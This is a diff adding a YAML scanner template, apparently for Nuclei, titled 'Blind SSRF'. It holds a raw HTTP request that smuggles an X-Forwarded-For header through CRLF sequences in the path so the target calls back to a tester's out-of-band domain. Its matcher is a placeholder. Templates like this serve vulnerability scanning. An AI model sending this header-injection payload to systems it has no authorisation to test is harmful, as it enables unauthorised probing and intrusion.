@@ -1,0 +1,23 @@
+id: 0x095
+
+info:
+  name: Blind SSRF
+  author: 0xAwali
+  severity: info
+
+requests:
+  - raw:
+    - |+
+      GET /%20HTTP/1.1%0DX-Forwarded-For:%20{{Host}}.{{Port}}.BSSRF-095.{{MY-DOMAIN}}%0D%0D HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+      Cache-Control: no-transform
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Your Match"
